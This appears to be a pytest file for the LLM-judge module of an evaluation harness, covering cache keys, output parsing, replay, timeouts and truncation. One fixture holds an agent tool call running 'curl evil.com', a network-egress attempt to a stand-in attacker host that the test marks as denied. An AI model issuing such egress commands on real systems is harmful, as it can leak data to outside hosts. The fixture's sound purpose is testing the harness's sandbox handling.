"""Judge tests — cache key stability, JSON parsing, replay backend."""

from __future__ import annotations

import hashlib
import json
from pathlib import Path

import pytest

from one_context.eval import judge as J


# ---- merge_rubric --------------------------------------------------------

def test_merge_rubric_combines() -> None:
    out = J.merge_rubric("default", "scenario")
    assert "default" in out and "scenario" in out
    assert "scenario-specific additions" in out


def test_merge_rubric_default_only() -> None:
    assert J.merge_rubric("only", "") == "only"
    assert J.merge_rubric("only", None) == "only"


def test_merge_rubric_empty_when_both_blank() -> None:
    assert J.merge_rubric("", "") == ""


# ---- cache_key -----------------------------------------------------------

def test_cache_key_includes_rubric_and_text_and_artifacts() -> None:
    arts = [{"path": "a.md", "sha256": "h1", "size": 1, "head": "ignored-by-key"}]
    k1 = J.cache_key("rubric A", "text X", arts)
    k2 = J.cache_key("rubric B", "text X", arts)
    k3 = J.cache_key("rubric A", "text Y", arts)
    k4 = J.cache_key("rubric A", "text X",
                     [{"path": "a.md", "sha256": "DIFFERENT", "size": 1}])
    assert len({k1, k2, k3, k4}) == 4


def test_cache_key_excludes_tool_calls_and_metadata() -> None:
    """ISS-016: tmp paths in tool_calls / model id must NOT change the key."""
    arts = [{"path": "a.md", "sha256": "h1", "size": 1}]
    # Even if caller passed a `tool_calls`-ish dict in artifacts (it's not in
    # the func signature), only path + sha256 participate. Verify by passing
    # extra keys and they don't change the key:
    k1 = J.cache_key("R", "T", arts)
    arts2 = [{"path": "a.md", "sha256": "h1", "size": 1, "head": "doesnt matter"}]
    k2 = J.cache_key("R", "T", arts2)
    assert k1 == k2


def test_cache_key_artifact_order_irrelevant() -> None:
    a = [{"path": "a.md", "sha256": "h1"}, {"path": "b.md", "sha256": "h2"}]
    b = [{"path": "b.md", "sha256": "h2"}, {"path": "a.md", "sha256": "h1"}]
    assert J.cache_key("R", "T", a) == J.cache_key("R", "T", b)


# ---- _parse_judge_output -------------------------------------------------

def test_parse_clean_json() -> None:
    raw = '{"pass": true, "score": 0.9, "reason": "ok"}'
    p, s, r = J._parse_judge_output(raw)
    assert p is True and s == 0.9 and r == "ok"


def test_parse_with_fence() -> None:
    raw = '```json\n{"pass": false, "score": 0.4, "reason": "bad"}\n```'
    p, s, r = J._parse_judge_output(raw)
    assert p is False and s == 0.4 and r == "bad"


def test_parse_with_prefix_text() -> None:
    raw = 'Here is my evaluation:\n{"pass": true, "score": 0.7, "reason": "fine"}\n'
    p, s, r = J._parse_judge_output(raw)
    assert p is True and s == 0.7


def test_parse_missing_fields_raises() -> None:
    with pytest.raises(ValueError, match="missing required fields"):
        J._parse_judge_output('{"score": 0.9}')


# ---- evaluate (with replay backend) --------------------------------------

def test_evaluate_no_rubric_fails(tmp_path: Path) -> None:
    res = J.evaluate(
        criteria="",
        final_text="hi",
        tool_calls=[],
        artifacts=[],
        cache_dir=tmp_path / "c",
    )
    assert res.pass_ is False
    assert "no rubric" in res.reason.lower()


def test_evaluate_via_replay(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Drop a file with the right sha256(prompt) name and replay returns it."""
    replay_dir = tmp_path / "replay"
    replay_dir.mkdir()
    monkeypatch.setenv("ONECXT_EVAL_JUDGE_REPLAY_DIR", str(replay_dir))

    criteria = "rubric"
    final_text = "answer"
    arts: list[dict] = []
    prompt = J.render_prompt(criteria, final_text, [], arts)
    key = hashlib.sha256(prompt.encode("utf-8")).hexdigest()
    (replay_dir / f"{key}.txt").write_text(
        '{"pass": true, "score": 0.95, "reason": "replay-ok"}',
        encoding="utf-8",
    )

    res = J.evaluate(
        criteria=criteria,
        final_text=final_text,
        tool_calls=[],
        artifacts=arts,
        cache_dir=tmp_path / "c",
    )
    assert res.pass_ is True
    assert res.score == 0.95
    assert res.cached is False
    # second call hits judge-cache, not replay
    res2 = J.evaluate(
        criteria=criteria, final_text=final_text,
        tool_calls=[], artifacts=arts,
        cache_dir=tmp_path / "c",
    )
    assert res2.cached is True


def test_evaluate_cache_unaffected_by_runId_path_in_tool_calls(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """ISS-016 invariant: tool_calls (with tmp paths) don't bust the cache."""
    replay_dir = tmp_path / "replay"
    replay_dir.mkdir()
    monkeypatch.setenv("ONECXT_EVAL_JUDGE_REPLAY_DIR", str(replay_dir))
    cache_dir = tmp_path / "cache"

    arts = [{"path": "a.md", "sha256": "h1", "size": 1, "head": "ignored"}]
    criteria = "R"
    final_text = "T"

    # First call — go through replay (record fake response)
    prompt1 = J.render_prompt(
        criteria, final_text,
        [{"name": "Write", "input": {"file_path": "/tmp/onecxt-eval-AAA/x"}}],
        arts,
    )
    (replay_dir / f"{hashlib.sha256(prompt1.encode()).hexdigest()}.txt").write_text(
        '{"pass": true, "score": 0.9, "reason": "first"}',
        encoding="utf-8",
    )
    res1 = J.evaluate(
        criteria=criteria, final_text=final_text,
        tool_calls=[{"name": "Write", "input": {"file_path": "/tmp/onecxt-eval-AAA/x"}}],
        artifacts=arts,
        cache_dir=cache_dir,
    )
    assert res1.cached is False

    # Second call — same artifacts/criteria/final_text, but tool_calls
    # contains a DIFFERENT tmp path. cache must STILL hit.
    res2 = J.evaluate(
        criteria=criteria, final_text=final_text,
        tool_calls=[{"name": "Write", "input": {"file_path": "/tmp/onecxt-eval-BBB/x"}}],
        artifacts=arts,
        cache_dir=cache_dir,
    )
    assert res2.cached is True
    assert res2.score == 0.9


def test_evaluate_replay_miss_raises(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    replay_dir = tmp_path / "replay"
    replay_dir.mkdir()
    monkeypatch.setenv("ONECXT_EVAL_JUDGE_REPLAY_DIR", str(replay_dir))
    with pytest.raises(RuntimeError, match="judge replay miss"):
        J.evaluate(
            criteria="r", final_text="t",
            tool_calls=[], artifacts=[],
            cache_dir=tmp_path / "c",
        )


# ── R-5 治理 D: provider_status_notice prepend ──────────────────────────


def test_render_prompt_without_notice_is_unchanged() -> None:
    """No notice arg → prompt = baseline body (no header)."""
    p = J.render_prompt("rubric", "out", [], [])
    assert not p.startswith("# provider 状态提示")
    assert "# criteria" in p


def test_render_prompt_with_notice_prepends_header() -> None:
    """notice arg → prepended notice block separated by --- before body."""
    p = J.render_prompt(
        "rubric", "out", [], [],
        provider_status_notice="timeout after 180s; P3 全过",
    )
    assert p.startswith("# provider 状态提示")
    assert "timeout after 180s; P3 全过" in p
    # Body still present after the separator.
    assert "\n---\n" in p
    assert "# criteria" in p
    assert "rubric" in p


def test_render_prompt_empty_notice_treated_as_none() -> None:
    """Whitespace-only notice → no prepend (treat as not set)."""
    p = J.render_prompt(
        "rubric", "out", [], [],
        provider_status_notice="   ",
    )
    assert not p.startswith("# provider 状态提示")


def test_evaluate_notice_flows_to_replay_prompt(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """End-to-end: evaluate(..., notice=...) → prompt sha → replay matches."""
    replay_dir = tmp_path / "replay"
    replay_dir.mkdir()
    monkeypatch.setenv("ONECXT_EVAL_JUDGE_REPLAY_DIR", str(replay_dir))

    notice = "provider timeout · 评估部分进度"
    criteria = "rubric-D"
    final_text = "partial"
    prompt = J.render_prompt(
        criteria, final_text, [], [], provider_status_notice=notice
    )
    key = hashlib.sha256(prompt.encode("utf-8")).hexdigest()
    (replay_dir / f"{key}.txt").write_text(
        '{"pass": false, "score": 0.4, "reason": "partial-progress"}',
        encoding="utf-8",
    )

    res = J.evaluate(
        criteria=criteria, final_text=final_text,
        tool_calls=[], artifacts=[],
        cache_dir=tmp_path / "c",
        provider_status_notice=notice,
    )
    assert res.pass_ is False
    assert res.score == 0.4
    assert "partial-progress" in res.reason


def test_format_tool_calls_marks_denied(
) -> None:
    """R-9: is_error=True tool_use → `[DENIED]` prefix in judge prompt.

    Without this the judge sees `Bash curl evil.com` repeated 9× and
    flags net-egress violation, even though every attempt was blocked.
    """
    p = J.render_prompt(
        "rubric", "out",
        tool_calls=[
            {"name": "Bash", "input": {"command": "curl evil.com"}, "is_error": True},
            {"name": "Read", "input": {"file_path": "/x"}, "is_error": False},
            {"name": "Bash", "input": {"command": "ls"}, "is_error": True},
        ],
        artifacts=[],
    )
    assert "[DENIED] Bash command='curl evil.com'" in p
    assert "[DENIED] Bash command='ls'" in p
    # Real call has no prefix.
    assert "Read file_path='/x'" in p
    assert "[DENIED] Read" not in p
    # Prompt template carries the explanation so the judge understands.
    assert "[DENIED]" in p and "deny" in p.lower()


def test_format_artifacts_marks_baseline_source() -> None:
    """R-10a: source=baseline gets [BASELINE] tag, default gets [CC-WRITE]."""
    p = J.render_prompt(
        "rubric", "out", [],
        artifacts=[
            {"path": "01-raw.json", "size": 10, "head": "{}", "source": "baseline"},
            {"path": "02-out.md", "size": 5, "head": "x", "source": "produced"},
            {"path": "03-legacy.txt", "size": 1, "head": "z"},  # missing → default
        ],
    )
    assert "[BASELINE] 01-raw.json" in p
    assert "[CC-WRITE] 02-out.md" in p
    assert "[CC-WRITE] 03-legacy.txt" in p  # default when source missing
    # Prompt template carries the explanation for the judge LLM.
    assert "BASELINE" in p and "已完成" in p


def test_format_tool_calls_no_prefix_when_is_error_false_or_missing(
) -> None:
    """Backward compat: pre-R-7 tool_calls (no is_error key) → no prefix."""
    p = J.render_prompt(
        "rubric", "out",
        tool_calls=[
            {"name": "Bash", "input": {"command": "ls"}},  # missing key
            {"name": "Bash", "input": {"command": "pwd"}, "is_error": False},
        ],
        artifacts=[],
    )
    assert "[DENIED]" not in [line for line in p.split("\n") if "Bash" in line][0]
    assert "  1. Bash command='ls'" in p
    assert "  2. Bash command='pwd'" in p


def test_evaluate_notice_changes_cache_via_final_text_separation(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Two evaluate calls with same final_text but different notice values
    map to the SAME cache key (notice is not in cache_key). Documented as
    intentional: when final_text differs (the typical case for timeout
    vs ok), cache separates naturally; same final_text + different notice
    is a pathological case we accept for simplicity.
    """
    cache_dir = tmp_path / "cache"
    # Pre-seed cache with a known judge result for criteria="r", final="t"
    key = J.cache_key("r", "t", [])
    cache_dir.mkdir(parents=True)
    (cache_dir / f"{key}.json").write_text(
        '{"pass": true, "score": 1.0, "reason": "from-cache"}',
        encoding="utf-8",
    )

    res = J.evaluate(
        criteria="r", final_text="t",
        tool_calls=[], artifacts=[],
        cache_dir=cache_dir,
        provider_status_notice="timeout notice",  # NOT in cache_key
    )
    assert res.cached is True
    assert res.score == 1.0


# ── Stage 2.X.2: _resolve_settings_path + _spawn_judge --settings injection ──


class TestResolveSettingsPath:
    """`_resolve_settings_path()` resolution order: env override → default → disabled."""

    def test_env_override_wins(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("ONECXT_CLAUDE_SETTINGS", "/tmp/custom-settings.json")
        monkeypatch.delenv("ONECXT_CLAUDE_SETTINGS_DISABLE_DEFAULT", raising=False)
        from one_context.eval.judge import _resolve_settings_path
        assert _resolve_settings_path() == "/tmp/custom-settings.json"

    def test_default_when_env_unset(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("ONECXT_CLAUDE_SETTINGS", raising=False)
        monkeypatch.delenv("ONECXT_CLAUDE_SETTINGS_DISABLE_DEFAULT", raising=False)
        monkeypatch.setenv("HOME", "/home/x")
        from one_context.eval.judge import _resolve_settings_path
        # CCD2 backup path is the project-default fallback for evals on this host.
        assert _resolve_settings_path() == "/home/x/.claude/settings.json.backup.20260529_153816"

    def test_disable_default_yields_none(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("ONECXT_CLAUDE_SETTINGS", raising=False)
        monkeypatch.setenv("ONECXT_CLAUDE_SETTINGS_DISABLE_DEFAULT", "1")
        from one_context.eval.judge import _resolve_settings_path
        assert _resolve_settings_path() is None

    def test_empty_env_override_falls_through_to_none(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Empty string for override + DISABLE_DEFAULT=1 → no --settings flag."""
        monkeypatch.setenv("ONECXT_CLAUDE_SETTINGS", "")
        monkeypatch.setenv("ONECXT_CLAUDE_SETTINGS_DISABLE_DEFAULT", "1")
        from one_context.eval.judge import _resolve_settings_path
        # Empty string is falsy → returned as None.
        assert _resolve_settings_path() is None


class TestSpawnJudgeSettings:
    """`_spawn_judge()` must append `--settings <path>` when resolver returns one."""

    def _capture_cmd(self, monkeypatch: pytest.MonkeyPatch) -> list[str]:
        """Patch subprocess.run; return the cmd argv list captured at call time."""
        captured: dict[str, list[str]] = {}

        class _FakeResult:
            returncode = 0
            stdout = '{"pass": true, "score": 0.9, "reason": "ok"}'
            stderr = ""

        def fake_run(cmd, **kw):  # noqa: ARG001 — kw mirrors subprocess.run
            captured["cmd"] = list(cmd)
            return _FakeResult()

        from one_context.eval import judge as J
        monkeypatch.setattr(J.subprocess, "run", fake_run)
        # Bypass JSON parsing detail; we only inspect cmd.
        monkeypatch.delenv("ONECXT_EVAL_JUDGE_REPLAY_DIR", raising=False)
        J._spawn_judge("prompt", "Kimi-K2.6")
        return captured["cmd"]

    def test_settings_appended_with_explicit_override(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("ONECXT_CLAUDE_SETTINGS", "/etc/x.json")
        monkeypatch.delenv("ONECXT_CLAUDE_SETTINGS_DISABLE_DEFAULT", raising=False)
        cmd = self._capture_cmd(monkeypatch)
        assert cmd[0] == "claude"
        assert "--settings" in cmd
        assert cmd[cmd.index("--settings") + 1] == "/etc/x.json"
        assert "--model" in cmd
        assert cmd[cmd.index("--model") + 1] == "Kimi-K2.6"

    def test_settings_omitted_when_disabled(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("ONECXT_CLAUDE_SETTINGS", raising=False)
        monkeypatch.setenv("ONECXT_CLAUDE_SETTINGS_DISABLE_DEFAULT", "1")
        cmd = self._capture_cmd(monkeypatch)
        assert "--settings" not in cmd

    def test_default_settings_appended_when_env_unset(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("ONECXT_CLAUDE_SETTINGS", raising=False)
        monkeypatch.delenv("ONECXT_CLAUDE_SETTINGS_DISABLE_DEFAULT", raising=False)
        monkeypatch.setenv("HOME", "/Users/test")
        cmd = self._capture_cmd(monkeypatch)
        assert "--settings" in cmd
        assert (
            cmd[cmd.index("--settings") + 1]
            == "/Users/test/.claude/settings.json.backup.20260529_153816"
        )


# ── R-12a (design §16.7.17): judge spawn timeout 可配置 ──


class TestResolveJudgeTimeoutMs:
    """`_resolve_judge_timeout_ms()` env override → 默认 600s。"""

    def test_default_when_env_unset(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("ONECXT_EVAL_JUDGE_TIMEOUT_MS", raising=False)
        assert J._resolve_judge_timeout_ms() == 600_000
        assert J._resolve_judge_timeout_ms() == J.JUDGE_TIMEOUT_MS_DEFAULT

    def test_env_override_wins(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_TIMEOUT_MS", "900000")
        assert J._resolve_judge_timeout_ms() == 900_000

    def test_env_invalid_falls_back_to_default(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_TIMEOUT_MS", "not-a-number")
        assert J._resolve_judge_timeout_ms() == 600_000

    def test_env_non_positive_falls_back_to_default(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_TIMEOUT_MS", "0")
        assert J._resolve_judge_timeout_ms() == 600_000
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_TIMEOUT_MS", "-1")
        assert J._resolve_judge_timeout_ms() == 600_000

    def test_env_empty_string_falls_back_to_default(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_TIMEOUT_MS", "   ")
        assert J._resolve_judge_timeout_ms() == 600_000


class TestSpawnJudgeTimeoutWiring:
    """`_spawn_judge()` 实际 timeout 必须用 `_resolve_judge_timeout_ms()`。"""

    def _capture_timeout(self, monkeypatch: pytest.MonkeyPatch) -> float:
        captured: dict[str, float] = {}

        class _FakeResult:
            returncode = 0
            stdout = '{"pass": true, "score": 0.9, "reason": "ok"}'
            stderr = ""

        def fake_run(cmd, **kw):  # noqa: ARG001
            captured["timeout"] = kw["timeout"]
            return _FakeResult()

        monkeypatch.setattr(J.subprocess, "run", fake_run)
        monkeypatch.delenv("ONECXT_EVAL_JUDGE_REPLAY_DIR", raising=False)
        monkeypatch.setenv("ONECXT_CLAUDE_SETTINGS_DISABLE_DEFAULT", "1")
        J._spawn_judge("prompt", "Kimi-K2.6")
        return captured["timeout"]

    def test_default_timeout_is_600s(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("ONECXT_EVAL_JUDGE_TIMEOUT_MS", raising=False)
        assert self._capture_timeout(monkeypatch) == 600.0

    def test_env_override_applied(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_TIMEOUT_MS", "120000")
        assert self._capture_timeout(monkeypatch) == 120.0


# ── R-12b (design §16.7.17): judge prompt artifacts head 减肥 ──


class TestResolveArtifactHeadBytes:
    """`_resolve_artifact_head_bytes()` env override → 默认 1500。"""

    def test_default_when_env_unset(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("ONECXT_EVAL_JUDGE_ARTIFACT_HEAD_BYTES", raising=False)
        assert J._resolve_artifact_head_bytes() == 1500
        assert J._resolve_artifact_head_bytes() == J.JUDGE_ARTIFACT_HEAD_BYTES_DEFAULT

    def test_env_override_wins(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_ARTIFACT_HEAD_BYTES", "800")
        assert J._resolve_artifact_head_bytes() == 800

    def test_env_zero_means_no_truncation(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_ARTIFACT_HEAD_BYTES", "0")
        assert J._resolve_artifact_head_bytes() == 0

    def test_env_invalid_falls_back_to_default(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_ARTIFACT_HEAD_BYTES", "abc")
        assert J._resolve_artifact_head_bytes() == 1500

    def test_env_negative_falls_back_to_default(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_ARTIFACT_HEAD_BYTES", "-100")
        assert J._resolve_artifact_head_bytes() == 1500


class TestTruncateHead:
    """`_truncate_head()` 字节预算 + utf-8 安全 + 0 表示禁用。"""

    def test_no_truncation_when_under_budget(self) -> None:
        assert J._truncate_head("hello", 100) == "hello"

    def test_truncates_with_marker_appended(self) -> None:
        long = "a" * 5000
        out = J._truncate_head(long, 1500)
        assert out.endswith("... (truncated)")
        # 实际正文不超过预算（marker 不算预算内）
        body = out.removesuffix("... (truncated)").rstrip()
        assert len(body.encode("utf-8")) <= 1500

    def test_zero_max_bytes_disables(self) -> None:
        long = "x" * 9999
        assert J._truncate_head(long, 0) == long

    def test_negative_max_bytes_disables(self) -> None:
        long = "y" * 9999
        assert J._truncate_head(long, -1) == long

    def test_utf8_multibyte_safe(self) -> None:
        # 中文 3 字节/字符，截断不能切坏 utf-8
        s = "录" * 600  # ~1800 字节
        out = J._truncate_head(s, 1500)
        # 应该能解码（已 ignored partial code points）
        assert out.endswith("... (truncated)")
        body = out.removesuffix("... (truncated)").rstrip()
        body.encode("utf-8").decode("utf-8")  # 不抛


class TestFormatArtifactsTrimsHead:
    """`_format_artifacts()` 必须使用 `_resolve_artifact_head_bytes()`。"""

    def test_default_trims_long_head(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("ONECXT_EVAL_JUDGE_ARTIFACT_HEAD_BYTES", raising=False)
        long = "a" * 4000
        out = J._format_artifacts(
            [{"path": "f.md", "size": 4000, "head": long, "source": "baseline"}]
        )
        assert "[BASELINE]" in out
        assert "... (truncated)" in out
        # 落到 prompt 的整段长度（含 fenced block）应远小于原 4000B
        assert len(out) < 2500

    def test_env_zero_keeps_full_head(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_ARTIFACT_HEAD_BYTES", "0")
        long = "b" * 4000
        out = J._format_artifacts(
            [{"path": "g.md", "size": 4000, "head": long, "source": "produced"}]
        )
        assert "... (truncated)" not in out
        assert out.count("b") >= 4000

    def test_short_head_passes_through(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("ONECXT_EVAL_JUDGE_ARTIFACT_HEAD_BYTES", raising=False)
        out = J._format_artifacts(
            [{"path": "h.md", "size": 10, "head": "tiny body"}]
        )
        assert "tiny body" in out
        assert "... (truncated)" not in out


class TestCacheKeyUnaffectedByHeadTruncation:
    """R-12b 必须保留缓存不变性：path+sha256 不变 → cache_key 不变。"""

    def test_cache_key_stable_across_head_trim_env(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        arts = [{"path": "f.md", "sha256": "abc123", "head": "x" * 9000, "size": 9000}]
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_ARTIFACT_HEAD_BYTES", "100")
        k1 = J.cache_key("rubric", "final", arts)
        monkeypatch.setenv("ONECXT_EVAL_JUDGE_ARTIFACT_HEAD_BYTES", "0")
        k2 = J.cache_key("rubric", "final", arts)
        assert k1 == k2
